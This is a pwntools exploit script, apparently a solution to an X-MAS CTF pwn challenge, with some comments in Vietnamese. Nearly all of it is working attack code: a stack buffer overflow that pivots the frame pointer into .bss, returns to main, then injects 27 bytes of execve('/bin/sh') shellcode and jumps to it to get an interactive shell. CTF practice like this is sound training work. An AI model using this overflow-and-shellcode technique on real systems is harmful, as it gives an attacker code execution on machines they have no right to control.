from pwn import *
import sys

LIBCFILE = 'libc.so.6'
LIBCLOCAL = '/lib/x86_64-linux-gnu/libc-2.31.so'
BINFILE = "./chall"
HOST = 'challs.xmas.htsp.ro'
PORT = 2000

shellcode =  "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27 bytes




def solve(DEBUG):
    elf = ELF(BINFILE)
    libc = ELF(LIBCLOCAL)
    if DEBUG=="1":
        p = process(BINFILE)
        exploit(p,elf,libc)
    elif DEBUG=="2":
        libc = ELF(LIBCFILE)
        p = remote(HOST,PORT)
        exploit(p,elf,libc)
    else:
        p = process(BINFILE)
        raw_input('DEBUG')
        exploit(p,elf,libc)

def exploit(p,elf,libc):
    v5 = 0xe4ff000000000000
    pop_rdi = 0x0000000000400743
    pop_ret = 0x00000000004004fe
    main =   0x0040067b #mov word [var_2h], 0xe4ff
    bss_addr = 0x601500 # 0x601000 + 0x500  ==> 0x601000 -> dia chi bat dau cua .bss



    payload = "A"*40
    payload += p64(v5)
    payload += p64(bss_addr)
    payload += p64(main)


    p.recvuntil('Tell Santa what you want for XMAS\n')
    p.sendline(payload)


    bss_addr -= 0x30 # quay lai dinh cua buffer
    payload = shellcode
    payload += 'A'*13
    payload += p64(v5)
    payload += p64(bss_addr+0x30) # ebp  -> 1 gia tri bat ky
    payload += p64(bss_addr) # ret_ addr -> tro ve dinh stack

    p.recvuntil('Tell Santa what you want for XMAS\n')
    p.sendline(payload)



    p.interactive()

solve(sys.argv[1])